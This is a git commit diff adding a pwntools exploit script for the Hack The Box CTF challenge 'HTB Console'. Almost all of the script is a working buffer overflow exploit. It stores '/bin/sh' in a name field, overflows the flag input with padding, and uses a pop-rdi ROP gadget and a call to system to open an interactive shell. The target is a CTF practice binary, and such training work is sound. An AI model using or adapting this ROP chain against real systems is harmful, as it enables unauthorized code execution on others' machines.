80b3cade064e6431bb63a7409777c8ec070c436d
szhan21 <shunda.zhang@intel.com>
2023-01-11 12:24:34 +0800

    Resoved HTB Console!

--- ctf/pwn/HTBConsole/dec.py
+++ ctf/pwn/HTBConsole/dec.py
@@ -1,8 +1,32 @@
 from pwn import *
 
 io = process('./htb-console')
+#ip, port = 
+#io = remote(ip, port)
 
 elf = ELF('./htb-console')
 
-print elf.got.puts
-print elf.plt.puts
+padding = 'A'*24
+pop_rdi_ret = 0x0000000000401473
+ret = 0x000000000040101a
+
+payload = '/bin/sh\x00'
+
+io.sendlineafter('>> ', 'hof')
+io.sendlineafter('Enter your name: ', payload)
+
+payload = padding
+payload += p64(pop_rdi_ret)
+payload += p64(0x004040b0)
+payload += p64(0x00401381)	#call system
+#payload += p64(ret)
+#payload += p64(elf.plt.system)
+#payload += p64(elf.sym.system)
+#print hex(elf.plt.system)
+#print hex(elf.sym.system)
+
+io.sendlineafter('>> ', 'flag')
+io.sendlineafter('Enter flag: ', payload)
+#io.recvuntil('\n')
+
+io.interactive()
